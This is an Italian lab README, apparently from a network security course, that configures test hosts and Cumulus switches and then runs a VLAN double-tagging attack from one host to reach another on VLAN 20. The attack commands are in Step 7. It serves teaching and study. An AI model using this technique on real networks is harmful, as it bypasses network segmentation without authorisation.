# VLAN attack

### Step 1
Fare il setup dell'indirizzo IP di Tiny 1 (scripts/tiny1/Setup.sh):

    sudo ip addr add 10.0.10.101/24 dev eth0

### Step 2
Fare il setup dell'indirizzo IP di Tiny 2 (scripts/tiny2/Setup.sh):

    sudo ip addr add 10.0.20.101/24 dev eth0

### Step 3
Fare il setup dell'indirizzo IP di Tiny 3 (scripts/tiny3/Setup.sh):

    sudo ip addr add 10.0.10.102/24 dev eth0

### Step 4
Fare il setup dell'indirizzo IP di Tiny 4 (scripts/tiny4/Setup.sh):

    sudo ip addr add 10.0.20.102/24 dev eth0

### Step 5
Fare il setup del bridge e delle interfacce VLAN in Cumulus 1 (scripts/cumulus1/BridgeAndInterfaces.sh):

    net del all
    net commit
    net add bridge bridge ports swp1,swp2,swp3,swp4
    net add bridge bridge pvid 1			#definisce l'id del pacchetto 'untagged'
    net add bridge bridge vids 10,20		#definisce gli identifivatori VLAN configurati sullo switch
    net add interface swp1 bridge access 10		#configura la porta swp1 per essere un accesso per VLAN10
    net add interface swp2 bridge access 20		#configura la porta swp2 per essere un accesso per VLAN20
    net commit

### Step 6
Fare il setup del bridge e delle interfacce VLAN in Cumulus 2 (scripts/cumulus2/BridgeAndInterfaces.sh):

    net del all
    net commit
    net add bridge bridge ports swp1,swp2,swp3,swp4
    net add bridge bridge pvid 1			#definisce l'id del pacchetto 'untagged'
    net add bridge bridge vids 10,20		#definisce gli identifivatori VLAN configurati sullo switch
    net add interface swp1 bridge access 10		#configura la porta swp1 per essere un accesso per VLAN10
    net add interface swp2 bridge access 20		#configura la porta swp2 per essere un accesso per VLAN20
    net commit

### Step 7
Eseguire il double incapsulation attack in Tiny 5, che invierà pacchetti a Tiny 4 pur non avendo collegamenti leciti con VLAN 20 (scripts/tiny5/DoubleIncapsulation.sh):

    sudo ip link add link eth0 name eth0.1 type vlan id 1
    sudo ip link add link eth0.1 name eth0.1.20 type vlan id 20
    sudo ip link set eth0.1 up
    sudo ip link set eth0.1.20 up
    sudo ip addr add 10.0.20.250/24 dev eth0.1.20
    sudo arp -s 10.0.20.102 08:00:27:a2:8d:5b		#inserisce nella tabella ARP gli indirizzi MAC e IP di Tiny 4
